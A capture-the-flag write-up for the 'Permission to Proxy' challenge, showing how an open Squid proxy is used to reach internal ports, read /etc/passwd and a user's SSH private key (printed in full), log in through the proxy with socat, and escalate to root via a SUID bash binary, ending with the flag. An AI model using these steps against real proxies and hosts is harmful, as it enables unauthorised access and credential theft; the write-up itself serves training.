## Name: Permission to Proxy
#### Author: @JohnHammond
#### Category: Misc
#### Difficulty: N/D
#### Description: Where do we go from here?

Escalate your privileges and find the flag in root's home directory.

Yes, the error message you see on startup is intentional. ;)

## Procedure

When we connect to the server, we can see the following

<img width="1225" alt="Screenshot 2024-10-25 at 11 22 13 AM" src="https://github.com/user-attachments/assets/87f90689-cded-478d-b0e0-9a56a7ee310a" />

The server is [squid proxy server](https://www.squid-cache.org), so the challenge here is use the proxy to try to access to internal resources, like other machines into the network 10.128.0.0/24 or maybe the same server.

We will start checking what ports are open in the same server, and we can see the port 22 and 50000 open.

<img width="1200" alt="Screenshot 2024-10-25 at 11 22 58 AM" src="https://github.com/user-attachments/assets/4e320b19-4989-4ddb-b946-dca060b2cdf9" />

<img width="1207" alt="Screenshot 2024-10-25 at 11 23 15 AM" src="https://github.com/user-attachments/assets/5a29a129-4774-4dac-a2e4-dce810f05507" />

the tcp 22 is about SSH service, but TCP 50000 shows us a linux directory with path ```/```, now we can try to read an ssh key to try to access into the machine using ssh with squid proxy.

<img width="987" alt="Screenshot 2024-10-25 at 11 23 51 AM" src="https://github.com/user-attachments/assets/2fa48d5a-8f2d-4887-9613-632391c38683" />

The file ```/etc/passwd``` shows us the username ```user```, and using the command ```curl --proxy "challenge.ctf.games:30912" "http://permission-to-proxy-435ee5c1b183e84e-85bb87f785-96qzd:50000/home/user/.ssh/id_rsa" ``` we can recover the ssh key for user.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
JauN0ipko/W2sAAAAJa2FsaUBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----
```

Now we can connect to the remote server using the squid proxy server and the ssh service.

set permission for ssh key with command ```chmod 400 id_rsa_proxy ```

Connect to remote server with the command ```ssh -i id_rsa_proxy -o "ProxyCommand=socat - PROXY:challenge.ctf.games:%h:%p,proxyport=30912" user@permission-to-proxy-435ee5c1b183e84e-85bb87f785-96qzd```

![Screenshot 2024-10-25 at 11 27 33 AM](https://github.com/user-attachments/assets/46487afc-40dd-4654-b7df-4af311607940)

We are in!! :) . We need to get root permission to read flag.txt file, start checking for SUID permission with command ```find / -perm -u=s -type f 2>/dev/null```, this show the binary  ```/bin/bash```

![Screenshot 2024-10-25 at 11 28 44 AM](https://github.com/user-attachments/assets/36c4d0e9-0d75-42cb-94b2-5ed23b493cde)

Is enough just run ```./bash -p ``` to jump into root group and then read the flag.

![Screenshot 2024-10-25 at 11 29 23 AM](https://github.com/user-attachments/assets/39a1a4a9-29f9-43ed-9f57-3ca254bacc78)

![Screenshot 2024-10-25 at 11 29 49 AM](https://github.com/user-attachments/assets/9042b82e-54a3-4277-bfb1-9980720b4d00)

flag ```flag{c9bbd4888086111e9f632d4861c103f1}```
